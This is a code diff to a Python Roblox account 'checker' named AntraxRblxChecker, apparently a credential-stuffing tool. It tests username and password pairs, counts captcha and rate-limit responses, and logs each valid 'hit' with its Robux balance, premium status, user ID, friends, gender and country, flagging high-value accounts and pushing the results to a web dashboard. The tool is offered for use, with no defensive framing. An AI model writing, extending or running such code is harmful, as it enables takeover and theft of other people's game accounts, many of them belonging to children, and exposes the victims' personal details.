                     self.stats['high_value_accounts'] += 1
                 
-                # Save hit
-                self.save_hit(result)
-                
-                # Add to recent results
+                # Create detailed hit message
                 hit_msg = f"[HIT] {result.username} | R${result.robux}"
                 if result.premium:
                     hit_msg += " [PREMIUM]"
+                if result.user_id:
+                    hit_msg += f" | ID: {result.user_id}"
                 if result.country_name:
                     hit_msg += f" | {result.country_name}"
+                
+                # Add to web results
+                self.web_results.append(hit_msg)
                 self.recent_results.append(hit_msg)
                 print(f"  ✅ {hit_msg}")
+                
+                # Add detailed info
+                details = [
+                    f"    User ID: {result.user_id}",
+                    f"    Premium: {'YES' if result.premium else 'NO'}",
+                    f"    Robux: {result.robux:,}",
+                    f"    Account Age: {result.account_age}",
+                    f"    Friends: {result.friends}",
+                    f"    Followers: {result.followers}",
+                    f"    Gender: {'Male' if result.gender == 1 else 'Female' if result.gender == 2 else 'Unknown'}",
+                    f"    Country: {result.country_name or 'Unknown'}",
+                ]
+                self.web_results.extend(details)
+                print("\n".join(details))
                 
             elif result.status == 'invalid_password':
                 self.stats['wrong_password'] += 1
                 msg = f"[WRONG] {result.username}"
+                self.web_results.append(msg)
                 self.recent_results.append(msg)
                 print(f"  ❌ {msg}")
                 
             elif result.status == 'captcha':
                 self.stats['captcha'] += 1
                 msg = f"[CAPTCHA] {result.username}"
+                self.web_results.append(msg)
                 self.recent_results.append(msg)
                 print(f"  🤖 {msg}")
                 
             elif result.status == 'timeout':
                 self.stats['timeout'] += 1
                 msg = f"[TIMEOUT] {result.username}"
+                self.web_results.append(msg)
                 self.recent_results.append(msg)
                 print(f"  ⏱️ {msg}")
                 
             elif result.status == 'rate_limit':
                 self.stats['rate_limit'] += 1
                 msg = f"[RATE] {result.username}"
+                self.web_results.append(msg)
                 self.recent_results.append(msg)
                 print(f"  ⚠️ {msg}")
                 
             elif result.status == 'blocked':
                 self.stats['blocked'] += 1
                 msg = f"[BLOCKED] {result.username}"
+                self.web_results.append(msg)
                 self.recent_results.append(msg)
                 print(f"  🚫 {msg}")
                 
             elif result.status == 'driver_error':
                 self.stats['driver_error'] += 1
                 msg = f"[DRIVER] {result.username}"
+                self.web_results.append(msg)
                 self.recent_results.append(msg)
                 print(f"  ⚠️ {msg}")
                 
             else:
                 self.stats['other_errors'] += 1
                 msg = f"[ERROR] {result.username}: {result.message[:30]}"
+                self.web_results.append(msg)
                 self.recent_results.append(msg)
                 print(f"  ❌ {msg}")
             
             # Keep only last 50 results
             if len(self.recent_results) > 50:
                 self.recent_results = self.recent_results[-50:]
+            if len(self.web_results) > 200:
+                self.web_results = self.web_results[-200:]
             
             # Update stats for web
             self.stats['recent_results'] = self.recent_results[-10:]
@@ -1517,11 +803,19 @@ class AntraxRblxChecker:
                 time.sleep(delay)
         
         # Show final summary
-        print("\n" + "=" * 50)
-        print("[+] VERIFICATION COMPLETE")
-        print(f"[+] Total checked: {self.stats['verified']}")
-        print(f"[+] Valid hits: {self.stats['valid']}")
-        print(f"[+] Premium: {self.stats['premium_accounts']}")
-        print(f"[+] Total Robux: {self.stats['total_robux']:,}")
-        print(f"[+] High value: {self.stats['high_value_accounts']}")
-        print("=" * 50)
+        summary = [
+            "",
+            "=" * 50,
+            "VERIFICATION COMPLETE",
+            "=" * 50,
+            f"Total checked: {self.stats['verified']}",
+            f"Valid hits: {self.stats['valid']}",
+            f"Premium: {self.stats['premium_accounts']}",
+            f"Total Robux: {self.stats['total_robux']:,}",
+            f"High value: {self.stats['high_value_accounts']}",
+            "=" * 50
+        ]
+        
+        for line in summary:
+            self.web_results.append(line)
+            print(line)
